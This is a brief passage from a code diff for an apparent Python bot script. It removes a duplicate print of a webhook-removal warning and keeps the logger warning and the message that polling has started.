         logger.warning(f"remove_webhook: {e}")
-        print(f"Webhook removal warning: {e}")
-        sys.stdout.flush()
     print("Bot polling started. Press Ctrl+C to stop.")
     sys.stdout.flush()
     try:
